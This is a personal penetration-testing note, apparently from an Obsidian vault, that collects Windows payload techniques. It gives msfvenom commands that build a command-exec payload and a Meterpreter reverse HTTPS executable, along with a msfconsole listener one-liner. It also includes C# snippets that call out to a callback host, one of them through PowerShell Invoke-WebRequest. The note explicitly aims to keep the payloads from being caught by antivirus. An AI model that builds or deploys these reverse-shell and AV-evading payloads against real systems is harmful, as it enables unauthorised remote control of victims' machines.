---
creation date: November 8th 2023
last modified date: November 8th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[payloads]]  
___

## Description:  

Use virus total to ensure that these payloads wont get caught by AV

Testing with ping:
```
msfvenom -f c -p windows/exec CMD="cmd.exe /C ping 192.168.0.135"

tcpdump icmp -n -i wlan0
```

C# code for a a web request. This is good to test exploits without getting caught by AV. Needs to be compiled with visual studio or another compiler:

```
Raw C# code:

using System;
using System.Net.Http;
using System.Threading.Tasks;
 
class Program
{
    static async Task Main()
    {
        using (HttpClient httpClient = new HttpClient())
        {
            string url = "http://172.16.131.150/test";
            HttpResponseMessage response = await httpClient.GetAsync(url);
        }
    }
}


Run on Kali:
sudo python3 -m http.server 80
```

Run any powershell command (this will also create .dll files that need to be in the directory the exploit is running)
```
using System;  
using System.Management.Automation;

class Program  
{  
    static void Main()  
    {  
        using (PowerShell ps = PowerShell.Create())  
        {  

            // Build the PowerShell command  
            string command = $"Invoke-WebRequest -Uri '{url}'";

            // Add and invoke the PowerShell command  
            ps.AddScript(command);  
            ps.Invoke();  
        }  
    }  
}
```

### Metasploit Reverse Shell

```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set LHOST <IP>; set LPORT 443; exploit -j"

sudo msfvenom -p windows/meterpreter_reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f exe > test.exe
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: November 8th 2023 (10:25 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
